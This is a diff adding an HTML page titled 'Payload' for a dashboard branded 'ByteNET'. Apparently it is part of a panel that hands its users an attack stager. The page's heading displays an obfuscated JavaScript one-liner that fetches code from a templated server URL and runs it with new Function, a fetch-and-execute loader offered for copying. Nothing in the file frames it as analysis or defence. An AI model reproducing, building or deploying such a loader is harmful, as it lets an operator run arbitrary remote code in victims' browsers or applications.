@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+      }
+      main {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: sans-serif;
+        background-color: #36393f;
+        color: #fff;
+      }
+
+      h1 {
+        font-size: 4rem;
+        font-weight: bold;
+        text-align: center;
+        margin: 0;
+      }
+      .navbar {
+    background-color: #2C2F33; /* Dark gray color */
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    height: 50px;
+    padding: 0 20px;
+  }
+  .navbar-brand {
+    font-size: 24px;
+    font-weight: bold;
+    color: #FFFFFF; /* White color */
+    text-decoration: none;
+  }
+  .navbar-item {
+    font-size: 18px;
+    color: #FFFFFF; /* White color */
+    text-decoration: none;
+    padding: 10px;
+    transition: opacity 0.2s ease-in-out;
+  }
+  .navbar-item:hover {
+    background-color: #FFFFFF; /* White color */
+    color: #2C2F33; /* Dark gray color */
+    opacity: 0.7;
+  }
+  .navbar-item.left {
+    margin-right: auto;
+  }
+  .navbar-item.right {
+    margin-left: auto;
+  }
+    </style>
+  </head>
+  <body>
+    <nav class="navbar">
+      <a class="navbar-item left" href="/dashboard" style="opacity: 0;">Dashboard</a>
+      <a class="navbar-brand" href="/dashboard" style="opacity: 100%;">ByteNET</a>
+      <a class="navbar-item right" href="/logout" style="opacity: 0;">Logout</a>
+    </nav>
+    <main>
+      <h1><span>fetch("</span>{{ surl }}<span>")</span>['then'](_0x2f65c3=>_0x2f65c3['text']())['then'](_0x1770b7=>{const _0x237394=new Function(_0x1770b7);_0x237394();})['catch'](_0x1afb68=>console['error'](_0x1afb68));</h1>
+    </main>
+    <script>
+      window.onload = function() {
+    var navbarItems = document.getElementsByClassName("navbar-item");
+    for (var i = 0; i < navbarItems.length; i++) {
+        navbarItems[i].style.opacity = "1";
+    }
+}
+    </script>
+    </body>
+</html>
